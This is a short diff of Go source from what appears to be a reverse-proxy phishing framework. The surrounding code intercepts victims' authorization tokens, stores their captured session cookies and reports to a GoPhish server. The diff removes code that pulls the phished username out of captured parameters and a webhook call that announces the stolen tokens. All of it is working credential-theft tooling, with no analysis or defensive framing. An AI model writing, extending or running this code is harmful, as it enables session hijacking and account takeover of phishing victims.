@@ -1057,18 +1057,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-						var phishedUser string
-						if pl.username.key != nil && pl.username.search != nil {
-							for k, v := range s.Params {
-								if pl.username.key.MatchString(k) {
-									um := pl.username.search.FindStringSubmatch(v)
-									if um != nil && len(um) > 1 {
-										phishedUser = um[1]
-										break
-									}
-								}
-							}
-						}
+
 						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 							log.Error("database: %v", err)
 						}
@@ -1079,14 +1068,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("database: %v", err)
 						}
 						s.Finish(false)
-
-						if phishedUser != "" {
-							content := fmt.Sprintf("All authorization tokens captured for %s!", phishedUser)
-							p.NotifyWebhook(content)
-						} else {
-							content := "All authorization tokens captured!"
-							p.NotifyWebhook(content)
-						}
 
 						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 							rid, ok := s.Params["rid"]
